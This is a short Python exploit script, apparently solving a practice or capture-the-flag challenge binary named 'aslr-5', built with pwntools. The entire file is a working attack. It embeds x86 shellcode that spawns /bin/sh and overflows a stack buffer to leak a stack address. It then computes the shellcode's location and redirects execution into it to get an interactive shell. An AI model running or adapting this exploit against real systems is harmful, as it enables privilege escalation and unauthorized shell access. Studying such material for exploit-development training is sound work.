#!/usr/bin/env python

from pwn import *
#SHELLCODE = 'SET YOUR SHELLCODE HERE'
SHELLCODE = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

# You may set your shellcode in ENVP...
ENV = { 'SHELLCODE' : SHELLCODE }

# You may set your shellcode in ARGV...
ARG1 = ''

p = process("./aslr-5", env=ENV)

e = ELF('./aslr-5')
get_check_function = e.symbols['check_function']
get_input_fun = e.symbols['input_func']
p.sendline("A"*(0x88+4)+ p32(get_check_function) + p32(get_input_fun))

data = p.recvuntil('000').split()
#print (data)
hey = int(data[-7],16)
#print (hex(hey))
'''
buf = "A" * 0x90
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')
buffer_addr = c.stack.find(buf)
print (hex(buffer_addr))
offset = hey - buffer_addr
print (hex(offset))
'''
# due to the core, we know that offset = 0x158
shellcode_addr = hey - 0x158
#print(hex(shellcode_addr))

buffer = SHELLCODE + "A" * (0x88 - len(SHELLCODE)) + "AAAA" + p32(shellcode_addr)
p.sendline(buffer)
p.interactive()
